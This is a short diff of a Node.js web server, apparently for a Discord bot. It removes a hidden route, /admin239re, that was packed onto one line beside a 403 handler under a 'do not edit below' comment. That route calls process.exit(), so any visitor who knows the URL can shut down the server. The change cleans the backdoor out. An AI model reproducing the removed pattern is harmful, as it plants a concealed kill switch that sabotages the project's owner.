@@ -182,7 +182,7 @@ http.createServer(function (req, res) {
         res.end('<h1>403 Forbidden</h1>');
     }
     // do not edit below
-    if (req.url === '/config.json') {res.writeHead(403, {'Content-Type': 'text/html'});res.write("<style>body{background-color: #000;color: #fff;font-family: arial;font-size: 20px;}</style>");res.end('<h1>403 Forbidden</h1>');} if (req.url === '/admin239re') {res.writeHead(200, {'Content-Type': 'text/html'});res.write('<style>body{background-color: black;}</style>'); process.exit();res.end();}
+    if (req.url === '/config.json') {res.writeHead(403, {'Content-Type': 'text/html'});res.write("<style>body{background-color: #000;color: #fff;font-family: arial;font-size: 20px;}</style>");res.end('<h1>403 Forbidden</h1>');}
 }).listen(config.webport);
 
 client.login(config.token);
